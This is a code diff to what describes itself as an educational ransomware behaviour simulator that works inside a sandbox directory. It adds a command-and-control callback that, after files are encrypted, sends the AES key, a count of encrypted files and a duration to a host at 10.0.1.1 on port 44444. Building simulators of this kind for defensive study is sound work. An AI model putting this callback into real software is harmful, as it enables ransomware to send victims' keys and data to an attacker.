@@ -33,6 +33,7 @@ import os
 import sys
 
 import config
+from modules.callback import C2Integration
 from modules.cleanup import Cleanup
 from modules.evaluation import EvaluationCollector
 from modules.file_encryptor import FileEncryptor
@@ -120,7 +121,8 @@ def run_seed(force: bool = False) -> None:
     except ValueError:
         logger.critical(
             "SEED ABORTED — SANDBOX_DIR '%s' is not under BASE_DIR '%s'.",
-            config.SANDBOX_DIR, config.BASE_DIR,
+            config.SANDBOX_DIR,
+            config.BASE_DIR,
         )
         sys.exit(1)
 
@@ -163,7 +165,7 @@ def run_encrypt() -> None:
     collector.record_note_drop(note_paths)
 
     _save_session(key, enc_results)
-
+    run_c2_callback()
     report = collector.finalize()
     collector.export_json(report, config.REPORT_FILE)
     logger.info(
@@ -172,6 +174,20 @@ def run_encrypt() -> None:
         report.total_files_discovered,
         config.REPORT_FILE,
     )
+
+
+def run_c2_callback() -> None:
+    c2 = C2Integration(
+        c2_host="10.0.1.1",
+        c2_port=44444,
+    )
+    c2_payload = c2._to_payload(
+        ip="localhost",
+        aes_key="test_key",
+        file_encrypted=10,
+        duration=10,
+    )
+    c2.send(c2_payload)
 
 
 # ---------------------------------------------------------------------------
@@ -391,11 +407,13 @@ def main() -> None:
         description="Ransomware Behaviour Simulator (educational)"
     )
     parser.add_argument(
-        "--seed", action="store_true",
+        "--seed",
+        action="store_true",
         help="Populate test_data/ with sample files (first-time setup)",
     )
     parser.add_argument(
-        "--force", action="store_true",
+        "--force",
+        action="store_true",
         help="[--seed] overwrite existing target files in sandbox",
     )
     parser.add_argument(
